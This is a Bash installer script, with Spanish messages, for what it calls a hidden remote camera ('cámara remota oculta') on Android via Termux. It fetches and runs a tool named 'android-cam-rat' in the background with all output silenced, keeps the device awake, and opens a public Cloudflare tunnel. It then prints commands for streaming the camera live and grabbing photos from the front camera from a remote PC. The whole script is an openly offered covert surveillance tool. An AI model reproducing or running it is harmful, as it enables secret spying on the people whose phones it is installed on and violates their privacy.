d#!/bin/bash
echo "Instalando/actualizando cámara remota oculta para Android 14..."

pkg update -y >/dev/null 2>&1
pkg upgrade -y >/dev/null 2>&1
pkg install python termux-api opencv-python ffmpeg cloudflared wget -y >/dev/null 2>&1

cd $HOME
if [ -d "android-cam-rat" ]; then
    cd android-cam-rat && git pull --quiet
else
    git clone https://github.com/tuusuario/android-cam-rat.git >/dev/null 2>&1
    cd android-cam-rat
fi

chmod +x quickrat.py
termux-wake-lock >/dev/null 2>&1

# Matar procesos antiguos
pkill -f quickrat.py
pkill -f cloudflared

sleep 2

nohup python quickrat.py > /dev/null 2>&1 &
nohup cloudflared tunnel --url http://localhost:5000 > tunnel.log 2>&1 &

sleep 8
echo ""
echo "¡LISTO! Tu enlace permanente (guárdalo bien):"
grep -a "https://*.trycloudflare.com" tunnel.log | tail -1 || echo "En 10 segundos más aparecerá aquí"
echo ""
echo "Comandos desde tu PC:"
echo "   Streaming: mpv https://tuyoenlace.trycloudflare.com/live"
echo "   Foto:      curl https://tuyoenlace.trycloudflare.com/snapshot -o foto.jpg"
echo "   Frontal:   curl https://tuyoenlace.trycloudflare.com/camera/1"